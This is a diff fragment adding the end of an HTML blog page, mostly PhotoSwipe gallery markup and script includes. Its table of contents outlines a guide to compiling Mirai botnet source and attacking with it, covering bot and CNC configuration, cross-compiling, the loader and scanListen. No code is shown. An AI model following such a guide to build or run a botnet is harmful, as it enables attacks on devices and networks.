+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Compile-Mirai-Source"><span class="toc-number">1.</span> <span class="toc-text">Compile Mirai Source</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Install-Requirements"><span class="toc-number">1.1.</span> <span class="toc-text">Install Requirements</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Configure-Bot"><span class="toc-number">1.2.</span> <span class="toc-text">Configure Bot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Configure-CNC"><span class="toc-number">1.3.</span> <span class="toc-text">Configure CNC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cross-Compile"><span class="toc-number">1.4.</span> <span class="toc-text">Cross Compile</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack-with-Mirai"><span class="toc-number">2.</span> <span class="toc-text">Attack with Mirai</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CNC-Server"><span class="toc-number">2.1.</span> <span class="toc-text">CNC Server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Loader"><span class="toc-number">2.2.</span> <span class="toc-text">Loader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mirai-Bot"><span class="toc-number">2.3.</span> <span class="toc-text">Mirai Bot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#scanListen"><span class="toc-number">2.4.</span> <span class="toc-text">scanListen</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
